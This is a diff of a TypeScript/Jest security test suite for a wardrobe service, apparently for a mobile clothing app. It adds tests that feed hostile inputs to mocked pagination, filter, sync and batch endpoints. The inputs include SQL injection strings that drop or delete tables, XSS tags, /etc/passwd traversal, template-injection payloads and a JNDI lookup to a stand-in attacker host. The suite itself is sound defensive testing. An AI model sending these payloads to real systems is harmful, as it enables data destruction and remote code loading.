@@ -173,9 +173,10 @@ describe('WardrobeService Security Tests', () => {
 
         for (const maliciousId of maliciousUserIds) {
           // Should handle gracefully - either return empty results or throw controlled error
-          const result = await wardrobeService.getUserWardrobes(maliciousId);
-          expect(Array.isArray(result)).toBe(true);
-          expect(result).toHaveLength(0);
+          const result = await wardrobeService.getUserWardrobes({ userId: maliciousId });
+          expect(result).toBeDefined();
+          expect(Array.isArray(result.wardrobes)).toBe(true);
+          expect(result.wardrobes).toHaveLength(0);
         }
       });
 
@@ -549,11 +550,11 @@ describe('WardrobeService Security Tests', () => {
       it('should handle operations with potentially hijacked session', async () => {
         // Simulate session where user ID might be manipulated
         const suspiciousOperations = [
-          () => wardrobeService.getUserWardrobes('admin'),
-          () => wardrobeService.getUserWardrobes('root'),
-          () => wardrobeService.getUserWardrobes('system'),
-          () => wardrobeService.getUserWardrobes('0'),
-          () => wardrobeService.getUserWardrobes('null')
+          () => wardrobeService.getUserWardrobes({ userId: 'admin' }),
+          () => wardrobeService.getUserWardrobes({ userId: 'root' }),
+          () => wardrobeService.getUserWardrobes({ userId: 'system' }),
+          () => wardrobeService.getUserWardrobes({ userId: '0' }),
+          () => wardrobeService.getUserWardrobes({ userId: 'null' })
         ];
 
         for (const operation of suspiciousOperations) {
@@ -623,9 +624,461 @@ describe('WardrobeService Security Tests', () => {
         mockedWardrobeModel.findByUserId.mockResolvedValue(largeWardrobeSet);
         mockedWardrobeModel.getGarments.mockResolvedValue([]);
 
-        // Should handle large datasets efficiently
-        await expect(wardrobeService.getUserWardrobes(legitimateUserId))
+        // Should handle large datasets efficiently with new parameter structure
+        await expect(wardrobeService.getUserWardrobes({ userId: legitimateUserId }))
           .resolves.toBeDefined();
+      });
+    });
+  });
+
+  describe('Mobile Features Security', () => {
+    describe('Cursor-Based Pagination Security', () => {
+      it('should prevent cursor manipulation attacks', async () => {
+        const maliciousCursors = [
+          "'; DROP TABLE wardrobes; --",
+          "<script>alert('xss')</script>",
+          "../../etc/passwd",
+          "00000000-0000-0000-0000-000000000000",
+          "${jndi:ldap://attacker.com/exploit}",
+          "{{7*7}}",
+          "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert('xss')</script>"
+        ];
+
+        mockedWardrobeModel.findByUserId.mockResolvedValue([]);
+
+        for (const maliciousCursor of maliciousCursors) {
+          // Should handle malicious cursors safely
+          const result = await wardrobeService.getUserWardrobes({
+            userId: legitimateUserId,
+            pagination: {
+              cursor: maliciousCursor,
+              limit: 20
+            }
+          });
+          
+          expect(result).toBeDefined();
+          expect(result.wardrobes).toEqual([]);
+        }
+      });
+
+      it('should enforce pagination limits', async () => {
+        const excessiveLimits = [100, 1000, 999999, -1, 0];
+        
+        mockedWardrobeModel.findByUserId.mockResolvedValue([]);
+
+        for (const limit of excessiveLimits) {
+          const result = await wardrobeService.getUserWardrobes({
+            userId: legitimateUserId,
+            pagination: { limit }
+          });
+
+          // Should clamp to reasonable limits (max 50)
+          expect(result.pagination?.count ?? 0).toBeLessThanOrEqual(50);
+        }
+      });
+
+      it('should prevent backward pagination manipulation', async () => {
+        mockedWardrobeModel.findByUserId.mockResolvedValue([]);
+
+        // Attempt to manipulate backward pagination
+        const result = await wardrobeService.getUserWardrobes({
+          userId: legitimateUserId,
+          pagination: {
+            cursor: uuidv4(),
+            limit: 20,
+            direction: 'backward' as any
+          }
+        });
+
+        expect(result).toBeDefined();
+        expect(result.wardrobes).toBeDefined();
+      });
+    });
+
+    describe('Filter Injection Prevention', () => {
+      it('should sanitize search filter inputs', async () => {
+        const injectionAttempts = [
+          "'; DROP TABLE wardrobes; --",
+          "' OR '1'='1",
+          "<script>alert('xss')</script>",
+          "${jndi:ldap://attacker.com/exploit}",
+          "{{constructor.constructor('return process')().exit()}}",
+          "%' OR '1'='1' --"
+        ];
+
+        mockedWardrobeModel.findByUserId.mockResolvedValue([]);
+
+        for (const injection of injectionAttempts) {
+          const result = await wardrobeService.getUserWardrobes({
+            userId: legitimateUserId,
+            filters: { search: injection }
+          });
+
+          expect(result).toBeDefined();
+          expect(result.wardrobes).toEqual([]);
+        }
+      });
+
+      it('should validate sortBy field against whitelist', async () => {
+        const maliciousSortFields = [
+          "user_id",
+          "password",
+          "'; DROP TABLE wardrobes; --",
+          "internal_flags",
+          "1=1",
+          "created_at); DELETE FROM users; --"
+        ];
+
+        mockedWardrobeModel.findByUserId.mockResolvedValue([legitimateWardrobe]);
+        mockedWardrobeModel.getGarments.mockResolvedValue([]);
+
+        for (const maliciousField of maliciousSortFields) {
+          const result = await wardrobeService.getUserWardrobes({
+            userId: legitimateUserId,
+            filters: { sortBy: maliciousField as any }
+          });
+
+          // Should ignore invalid sort fields and use default
+          expect(result).toBeDefined();
+        }
+      });
+
+      it('should prevent date filter injection', async () => {
+        const maliciousDates = [
+          "'; DROP TABLE wardrobes; --",
+          "2024-01-01T00:00:00Z'); DELETE FROM wardrobes; --",
+          "invalid-date",
+          "${new Date().toISOString()}",
+          "{{7*7}}"
+        ];
+
+        mockedWardrobeModel.findByUserId.mockResolvedValue([]);
+
+        for (const maliciousDate of maliciousDates) {
+          // Should handle malicious date inputs safely
+          const result = await wardrobeService.getUserWardrobes({
+            userId: legitimateUserId,
+            filters: {
+              createdAfter: maliciousDate,
+              updatedAfter: maliciousDate
+            }
+          });
+
+          expect(result).toBeDefined();
+        }
+      });
+    });
+
+    describe('Sync Security', () => {
+      it('should prevent timestamp manipulation in sync', async () => {
+        const maliciousTimestamps = [
+          "1970-01-01T00:00:00Z", // Epoch - would sync everything
+          "2099-12-31T23:59:59Z", // Future - might cause issues
+          "'; DROP TABLE wardrobes; --",
+          "invalid-timestamp"
+        ];
+
+        mockedWardrobeModel.findByUserId.mockResolvedValue([]);
+
+        for (const timestamp of maliciousTimestamps) {
+          // Should handle invalid timestamps gracefully
+          const result = await wardrobeService.syncWardrobes({
+            userId: legitimateUserId,
+            lastSyncTimestamp: new Date(timestamp)
+          });
+
+          expect(result).toBeDefined();
+          expect(result.sync).toBeDefined();
+        }
+
+        // Test null and undefined separately - they should cause TypeScript errors in real usage
+        // but in tests we verify runtime behavior
+        const nullResult = await wardrobeService.syncWardrobes({
+          userId: legitimateUserId,
+          lastSyncTimestamp: null as any
+        });
+        expect(nullResult).toBeDefined();
+
+        const undefinedResult = await wardrobeService.syncWardrobes({
+          userId: legitimateUserId,
+          lastSyncTimestamp: undefined as any
+        });
+        expect(undefinedResult).toBeDefined();
+      });
+
+      it('should prevent cross-user data leakage in sync', async () => {
+        const userWardrobes = [
+          wardrobeMocks.createValidWardrobe({ user_id: legitimateUserId }),
+          wardrobeMocks.createValidWardrobe({ user_id: legitimateUserId })
+        ];
+
+        // Mock should only return requesting user's wardrobes
+        mockedWardrobeModel.findByUserId
+          .mockImplementation((userId) => 
+            Promise.resolve(userId === legitimateUserId ? userWardrobes : [])
+          );
+
+        mockedWardrobeModel.getGarments.mockResolvedValue([]);
+
+        const syncResult = await wardrobeService.syncWardrobes({
+          userId: legitimateUserId,
+          lastSyncTimestamp: new Date(Date.now() - 60000)
+        });
+
+        // Should only contain legitimate user's wardrobes
+        syncResult.wardrobes.created.forEach(w => {
+          expect(w.user_id).toBe(legitimateUserId);
+        });
+      });
+
+      it('should enforce reasonable sync limits', async () => {
+        // Create many wardrobes to test sync limits
+        const manyWardrobes = Array.from({ length: 1000 }, () => 
+          wardrobeMocks.createValidWardrobe({ user_id: legitimateUserId })
+        );
+
+        mockedWardrobeModel.findByUserId.mockResolvedValue(manyWardrobes);
+        mockedWardrobeModel.getGarments.mockResolvedValue([]);
+
+        // Very old timestamp would sync everything
+        const veryOldTimestamp = new Date('2020-01-01');
+
+        const result = await wardrobeService.syncWardrobes({
+          userId: legitimateUserId,
+          lastSyncTimestamp: veryOldTimestamp
+        });
+
+        // Should handle large sync gracefully
+        expect(result).toBeDefined();
+        expect(result.sync.hasMore).toBeDefined();
+      });
+    });
+
+    describe('Batch Operations Security', () => {
+      it('should prevent batch operation injection', async () => {
+        const maliciousOperations = [
+          {
+            type: 'create',
+            data: { 
+              name: "'; DROP TABLE wardrobes; --",
+              description: "<script>alert('xss')</script>"
+            },
+            clientId: 'malicious-1'
+          },
+          {
+            type: 'update',
+            data: {
+              id: "'; DELETE FROM wardrobes; --",
+              name: "Innocent Name"
+            },
+            clientId: 'malicious-2'
+          },
+          {
+            type: 'delete',
+            data: {
+              id: "' OR '1'='1"
+            },
+            clientId: 'malicious-3'
+          }
+        ];
+
+        // All operations should be rejected due to validation
+        const result = await wardrobeService.batchOperations({
+          userId: legitimateUserId,
+          operations: maliciousOperations as any
+        });
+
+        expect(result.errors.length).toBeGreaterThan(0);
+      });
+
+      it('should enforce batch size limits', async () => {
+        const oversizedBatch = Array.from({ length: 51 }, (_, i) => ({
+          type: 'create' as const,
+          data: { name: `Batch ${i}` },
+          clientId: `client-${i}`
+        }));
+
+        await expect(wardrobeService.batchOperations({
+          userId: legitimateUserId,
+          operations: oversizedBatch
+        })).rejects.toThrow('Cannot process more than 50 operations at once');
+      });
+
+      it('should prevent cross-user operations in batch', async () => {
+        const operations = [
+          {
+            type: 'update' as const,
+            data: {
+              id: targetWardrobeId, // Belongs to legitimate user
+              name: 'Updated Name'
+            },
+            clientId: 'update-1'
+          }
+        ];
+
+        mockedWardrobeModel.findById.mockResolvedValue(legitimateWardrobe);
+
+        // Malicious user trying to update legitimate user's wardrobe
+        const result = await wardrobeService.batchOperations({
+          userId: maliciousUserId,
+          operations
+        });
+
+        expect(result.errors).toHaveLength(1);
+        expect(result.errors[0].code).toContain('AUTHORIZATION');
+      });
+
+      it('should handle malformed batch operations', async () => {
+        const malformedOperations = [
+          {
+            // Missing type
+            data: { name: 'Test' },
+            clientId: 'malformed-1'
+          },
+          {
+            type: 'invalid-type', // Invalid type
+            data: { name: 'Test' },
+            clientId: 'malformed-2'
+          },
+          {
+            type: 'create',
+            // Missing data
+            clientId: 'malformed-3'
+          },
+          {
+            type: 'create',
+            data: { name: 'Valid' },
+            // Missing clientId
+          }
+        ];
+
+        const result = await wardrobeService.batchOperations({
+          userId: legitimateUserId,
+          operations: malformedOperations as any
+        });
+
+        // All should result in errors
+        expect(result.errors.length).toBeGreaterThan(0);
+      });
+
+      it('should maintain atomicity in batch operations', async () => {
+        mockedWardrobeModel.findByUserId.mockResolvedValue([]);
+        mockedWardrobeModel.create
+          .mockResolvedValueOnce(legitimateWardrobe) // First succeeds
+          .mockRejectedValueOnce(new Error('Database error')); // Second fails
+
+        const operations = [
+          {
+            type: 'create' as const,
+            data: { name: 'Success Wardrobe' },
+            clientId: 'success-1'
+          },
+          {
+            type: 'create' as const,
+            data: { name: 'Fail Wardrobe' },
+            clientId: 'fail-1'
+          }
+        ];
+
+        const result = await wardrobeService.batchOperations({
+          userId: legitimateUserId,
+          operations
+        });
+
+        // Should handle partial failures gracefully
+        expect(result.results).toHaveLength(1);
+        expect(result.errors).toHaveLength(1);
+        expect(result.summary.successful).toBe(1);
+        expect(result.summary.failed).toBe(1);
+      });
+    });
+
+    describe('Legacy Compatibility Security', () => {
+      it('should handle legacy pagination parameter injection', async () => {
+        const maliciousPages = [-1, 0, 999999, "1'; DROP TABLE wardrobes; --", null];
+        const maliciousLimits = [-1, 0, 1000, "50'; DELETE FROM users; --", null];
+
+        mockedWardrobeModel.findByUserId.mockResolvedValue([]);
+
+        for (const page of maliciousPages) {
+          for (const limit of maliciousLimits) {
+            if (page !== null && limit !== null) {
+              const result = await wardrobeService.getUserWardrobes({
+                userId: legitimateUserId,
+                legacy: { 
+                  page: page as any, 
+                  limit: limit as any 
+                }
+              });
+
+              expect(result).toBeDefined();
+            }
+          }
+        }
+      });
+
+      it('should maintain security when mixing legacy and mobile features', async () => {
+        mockedWardrobeModel.findByUserId.mockResolvedValue([]);
+
+        // Attempt to use both pagination systems simultaneously
+        const result = await wardrobeService.getUserWardrobes({
+          userId: legitimateUserId,
+          pagination: { cursor: uuidv4(), limit: 20 },
+          legacy: { page: 1, limit: 50 }
+        });
+
+        // Should handle gracefully, preferring one system
+        expect(result).toBeDefined();
+        expect(result.wardrobes).toBeDefined();
+      });
+    });
+
+    describe('Combined Attack Scenarios', () => {
+      it('should handle combined injection attacks across features', async () => {
+        const complexAttack = {
+          userId: "admin'; DROP TABLE users; --",
+          pagination: {
+            cursor: "<script>alert('xss')</script>",
+            limit: 999999
+          },
+          filters: {
+            search: "' OR '1'='1",
+            sortBy: "password" as any,
+            sortOrder: "'; DELETE FROM wardrobes; --" as any,
+            createdAfter: "1970-01-01'; DROP TABLE wardrobes; --"
+          }
+        };
+
+        mockedWardrobeModel.findByUserId.mockResolvedValue([]);
+
+        // Should handle complex attack gracefully
+        const result = await wardrobeService.getUserWardrobes(complexAttack);
+        expect(result).toBeDefined();
+        expect(result.wardrobes).toEqual([]);
+      });
+
+      it('should prevent timing attacks in sync operations', async () => {
+        const timings: number[] = [];
+        
+        mockedWardrobeModel.findByUserId.mockResolvedValue([]);
+
+        // Measure timing for valid vs invalid operations
+        for (let i = 0; i < 10; i++) {
+          const start = Date.now();
+          
+          await wardrobeService.syncWardrobes({
+            userId: i % 2 === 0 ? legitimateUserId : maliciousUserId,
+            lastSyncTimestamp: new Date()
+          });
+          
+          timings.push(Date.now() - start);
+        }
+
+        // Timing differences should be minimal (< 50ms variance)
+        const avgTiming = timings.reduce((a, b) => a + b, 0) / timings.length;
+        const maxVariance = Math.max(...timings.map(t => Math.abs(t - avgTiming)));
+        
+        expect(maxVariance).toBeLessThan(50);
       });
     });
   });
